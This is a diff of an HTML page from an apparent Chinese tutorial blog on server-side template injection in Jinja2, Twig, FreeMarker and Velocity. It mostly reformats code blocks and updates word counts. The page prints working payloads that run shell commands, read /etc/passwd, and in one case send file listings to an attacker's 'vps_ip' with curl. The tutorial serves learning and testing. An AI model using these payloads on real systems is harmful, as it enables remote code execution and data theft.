@@ -381,14 +381,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.5k
+                    3.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    13 分
                 </div>
                 
 
@@ -423,7 +423,7 @@
 <p><a target="_blank" rel="noopener" href="https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm">Server Side Template Injection</a></p>
 <h2 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h2><p>目前python常见模板引擎有jinjia2、Django、tornado等</p>
 <h3 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h3><p>jinjia2中存在三种语法</p>
-<pre><code>1. &#123;&#123; &#125;&#125; 变量取值
+<pre class=" language-text"><code class="language-text">1. &#123;&#123; &#125;&#125; 变量取值
 2. &#123;% %&#125; 控制结构
 3.  注释
 4. \# \# 可以有和&#123;% %&#125;相同的效果
@@ -504,15 +504,15 @@ pay <span class="token operator">=</span> int<span class="token punctuation">(</
 <pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">)</span>
 </code></pre>
 <ul>
-<li>config.item()<pre><code>&#123;&#123; config.item() &#125;&#125;  可以获取一些配置信息
+<li>config.item()<pre class=" language-text"><code class="language-text">&#123;&#123; config.item() &#125;&#125;  可以获取一些配置信息
 </code></pre>
 </li>
 </ul>
 <h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>在模板里过滤器相当于一个函数，变量通过过滤器处理后返回，语法<code>&#123;&#123; 变量 | 过滤器 &#125;&#125;</code></p>
 <p>原文介绍</p>
-<pre><code>变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。
+<pre class=" language-text"><code class="language-text">变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。
 
-看看例z
+看看例子
 &#123;&#123;my_variable|default('my_variable is not defined')&#125;&#125;
 
  my_variable 为变量，default为过滤器,my_variable is not defined是过滤器的参数。default过滤器的含义是：判断被转换的变量是否被定义过，如果没有被定义，则用字符串参数替换被转换的变量。
@@ -531,7 +531,7 @@ pay <span class="token operator">=</span> int<span class="token punctuation">(</
         <span class="token keyword">continue</span>
 </code></pre>
 <p>payload：</p>
-<pre><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os'].system('ls > tt.txt & cat tt.txt | xargs -I &#123;&#125; curl http://vps_ip/?&#123;&#125;')&#125;&#125;
+<pre class=" language-text"><code class="language-text">&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os'].system('ls > tt.txt & cat tt.txt | xargs -I &#123;&#125; curl http://vps_ip/?&#123;&#125;')&#125;&#125;
 
 这里用到了xargs来传递管道参数，xargs的一个选项-I，使用-I指定一个替换字符串&#123;&#125;，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次（注：xargs的详细用法见http://man.linuxde.net/xargs）
 </code></pre>
@@ -547,7 +547,7 @@ pay <span class="token operator">=</span> int<span class="token punctuation">(</
         <span class="token keyword">continue</span>
 </code></pre>
 <p>找到有读文件功能的类，比如说在40下标有个’file’类<br>payload：</p>
-<pre><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
+<pre class=" language-python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>需要注意的一个点：python3已经移除了file。所以利用file子类文件读取只能在python2中用。</p>
 <p>文章：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">关于python魔术方法payload：””.__class__.__mro__[2].__subclasses__()<a href="%22/etc/passwd%22">40</a>.read() 的解释</a></p>
@@ -557,7 +557,7 @@ pay <span class="token operator">=</span> int<span class="token punctuation">(</
 <h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
 <p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env，env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache() 方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置，所以</p>
 <p>模板的攻击手法都差不多</p>
-<pre><code>&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;
+<pre class=" language-text"><code class="language-text">&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;
 
 &#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;
 
@@ -718,26 +718,26 @@ payload<span class="token punctuation">:</span>
 <p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象。?new() 是其高级内置函数。</p>
 <p>可以看freemarker的文档：<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">https://freemarker.apache.org/docs/ref_builtins_expert.html</a></p>
 <p>用法如下：</p>
-<pre><code>&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
-&lt;#assign word_wrapp =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;
-&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
-&lt;#assign word_wrapp_narrow =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;
+<pre class=" language-text"><code class="language-text"><＃ - 创建一个用户定义的指令，调用类的参数构造函数 - >
+<#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）>
+<＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - >
+<#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）>
 </code></pre>
 <p>那么我么可以调用freemarker中的内置执行命令的对象 Execute</p>
 <ol>
 <li><p>在 freemarker.templete.utility 里面有个 Execute 类，这个类会执行它的参数，因此我们可以new一个Execute对象，传输可执行命令来达到rce</p>
 <p>payload：</p>
-<pre><code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;whoami&quot;)&#125;
+<pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.Execute"?new()>$&#123;value("whoami")&#125;
 </code></pre>
 </li>
 <li><p>在freemarker.templete.utility里有个 ObjectConstructor 类，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造</p>
 <p>payload：</p>
-<pre><code>&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;
+<pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.ObjectConstructor"?new()>$&#123;value("java.lang.ProcessBuilder","whoami").start()&#125;
 </code></pre>
 </li>
 <li><p>在freemarker.template.utility里面的 JythonRuntime，可以通过自定义标签的方式，执行Python命令。</p>
 <p>payload：</p>
-<pre><code>&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;whoami&quot;)&lt;/@value&gt;
+<pre class=" language-text"><code class="language-text"><#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("whoami")</@value>
 </code></pre>
 </li>
 </ol>
@@ -759,7 +759,7 @@ payload<span class="token punctuation">:</span>
 <p>我们可以去JavaDoc去看看有没有可用的类</p>
 <p><img src="https://bu.dusays.com/2021/10/23/f57a53256ba75.png"></p>
 <p>简单利用：</p>
-<pre><code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;whoami&quot;) &#125;
+<pre class=" language-text"><code class="language-text"><#assign ex="freemarker.template.utility.Execute"?new()> $&#123; ex("whoami") &#125;
 </code></pre>
 <p>来源：<a target="_blank" rel="noopener" href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a></p>
 <h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/378827f1dfc8">Velocity</a>是另一种流行的 Java 模板语言，利用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的函数，也没有明显的默认变量列表。以下屏幕截图显示了用于暴力破解变量名称的 Burp Intruder 工具，变量名称位于“有效负载”列的左侧，右侧是服务器的输出。</p>
@@ -768,13 +768,13 @@ payload<span class="token punctuation">:</span>
 <p>一种方法和一种属性脱颖而出：</p>
 <p>$class.inspect(类&#x2F;对象&#x2F;字符串)&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回检查指定类或对象的新 ClassTool 实例<br>$class.type&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回正在检查的实际类</p>
 <p>我们可以将$class.inspect与$class.type 链接起来以获取对任意对象的引用。然后我们可以使用<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec(java.lang.String)">Runtime.exec()</a>在目标系统上执行任意 shell 命令。</p>
-<pre><code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor()
+<pre class=" language-text"><code class="language-text">$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
 该模板旨在导致明显的时间延迟。
 </code></pre>
 <p>获取 shell 命令的输出有点棘手（毕竟这是 Java）：</p>
-<pre><code>#set($str=$class.inspect(&quot;java.lang.String&quot;).type)
-#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)
-#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))
+<pre class=" language-text"><code class="language-text">#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
@@ -1186,7 +1186,7 @@ DTD（document type define文档类型定义）作用是定义XML文档的合法
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">19.7k</span>
+                        class="white-color">21.6k</span>
             
             
             
